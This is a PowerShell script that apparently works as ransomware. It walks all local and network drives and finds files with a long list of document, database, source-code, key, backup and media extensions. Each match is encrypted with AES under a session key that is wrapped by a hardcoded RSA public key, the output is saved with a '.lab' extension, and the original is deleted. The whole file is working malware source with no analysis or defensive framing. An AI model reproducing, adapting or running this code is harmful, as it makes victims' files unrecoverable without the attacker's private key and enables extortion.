#static param
$pbkey = "<RSAKeyValue><Modulus>uxq63403opARGa28K+QNZXcPin2NUq5QNaGP/3KwuUA6YliuTuCthkn56WqHrPJgDDKFAjFnorqCtfejDk39QqqhYP1CdmRPld7vDbQkCJXPcp8F4qZEhenVEboOtgxJlNFzsP3NWuTnPYXGUX/lo8SYJH3VL6mhC3vvgQX7Lbxdjok/suGcg1K4Pn3RCskJSfiUHrma7X5TEq+fIjtAk/WIcHd56t8cs3am4b6HWK0CwuWXXKaxeBd3tkloJVOnZdXh5O18zE5bW5NFBvaJ0Rf1NJJ+Fg3kvUAZmxlgdsbgRKnwDiqR4Nj9Bg8jY3W6BTKb4/x5HpuKGXTJncUTdQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
$extensions = @(".py",".html",".gddoc",".der",".pfx",".key",".crt",".csr",".p12",".pem",".odt",".ott",".sxw",".stw",".uot",".3ds",".max",".3dm",".ods",".ots",".sxc",".stc",".dif",".slk",".wb2",".odp",".otp",".sxd",".std",".uop",".odg",".otg",".sxm",".mml",".lay",".lay6",".asc",".sqlite3",".sqlitedb",".sql",".accdb",".mdb",".db",".dbf",".odb",".frm",".myd",".myi",".ibd",".mdf",".ldf",".sln",".suo",".cs",".c",".cpp",".pas",".h",".asm",".js",".cmd",".bat",".vbs",".vb",".pl",".dip",".dch",".sch",".brd",".jsp",".php",".asp",".rb",".java",".jar",".class",".sh",".mp3",".wav",".swf",".fla",".wmv",".mpg",".vob",".mpeg",".asf",".avi",".mov",".mp4",".3gp",".mkv",".3g2",".flv",".wma",".mid",".m3u",".m4u",".djvu",".svg",".ai",".psd",".nef",".tiff",".tif",".cgm",".raw",".gif",".png",".bmp",".jpg",".jpeg",".vcd",".iso",".backup",".zip",".rar",".7z",".gz",".tgz",".tar",".bak",".tbk",".bz2",".PAQ",".ARC",".aes",".gpg",".vmx",".vmdk",".vdi",".sldm",".sldx",".sti",".sxi",".602",".hwp",".snt",".onetoc2",".dwg",".pdf",".wk1",".wks",".123",".rtf",".csv",".txt",".vsdx",".vsd",".edb",".eml",".msg",".ost",".pst",".potm",".potx",".ppam",".ppsx",".ppsm",".pps",".pot",".pptm",".pptx",".ppt",".xltm",".xltx",".xlc",".xlm",".xlt",".xlw",".xlsb",".xlsm",".xls",".xlsx",".dotx",".dotm",".dot",".docm",".docb",".docx",".doc")
#function
function Get_Session{
	$session_Bits = 512
	$session_byte = new-object 'System.Byte[]' ($session_Bits/8)
	(new-object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($session_byte)
	return (new-object System.Runtime.Remoting.Metadata.W3cXsd2001.SoapHexBinary @(,$session_byte))
}
function checkfilesize {
 param ([String]$file)
 try{
    if ((Get-Item $file).length/1GB -ige 2)
        {
		    return 0
        }
	    else{
	        return 1
	    }
    }
 catch {
    return 0
 }
}

#encrypt_file
function rsa_aes_ecnrypt_file{
param ([String]$oFile,$pub)
try {
    $OutputFile = [System.IO.Path]::GetFullPath($oFile) + ".lab"
    $InputStream = New-Object IO.FileStream($oFile, [IO.FileMode]::Open, [IO.FileAccess]::Read)
    $OutputStream = New-Object IO.FileStream($OutputFile, [IO.FileMode]::Create, [IO.FileAccess]::Write)
    #encrypt_session
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $session = Get_session
    $rsa.FromXmlString($pub)
    $ensession = $rsa.Encrypt($session.Value,0)
    #salt
    $Salt = New-Object Byte[](32)
    $Prng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $Prng.GetBytes($Salt)
    # Derive random bytes using PBKDF2 from Salt and Session
    $PBKDF2 = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($session,$Salt)
    # Get our AES key, iv and hmac key from the PBKDF2 stream
    $AESKey  = $PBKDF2.GetBytes(32)
    $AESIV   = $PBKDF2.GetBytes(16)
    # Setup our encryptor
    $AES = New-Object Security.Cryptography.AesManaged
    $Enc = $AES.CreateEncryptor($AESKey, $AESIV)
    # Write our Salt now, then append the encrypted data
    $OutputStream.Write($ensession+$Salt,0,$ensession.Length+$Salt.Length)
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($OutputStream, $Enc, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $InputStream.CopyTo($CryptoStream)
    # Release Stream Resource
    $CryptoStream.Close()
    $InputStream.Close()
    $OutputStream.Close()
    # delete Stream Resource
    Remove-Item $oFile
    }
    catch {
          Write-Host "Abort" $Error[0]
    } 
}

# get logicalDisk
$driverDir = @(($drivers = Gwmi Win32_LogicalDisk -filter "DriveType = 4").DeviceID,($drivers = Gwmi Win32_LogicalDisk -filter "DriveType = 3").DeviceID)
# get target dir
$Targetlist = $driverDir | ForEach-Object {Get-ChildItem $_ -Recurse }|?{$extensions -contains $_.Extension}|ForEach-Object{ if ($_.FullName -notmatch "Windows|Program Files") {$_.FullName}}|sort -unique
$Targetlist | ForEach-Object{
    if (checkfilesize($_)){
        rsa_aes_ecnrypt_file -oFile $_ -pub $pbkey -ErrorAction SilentlyContinue
    }
}

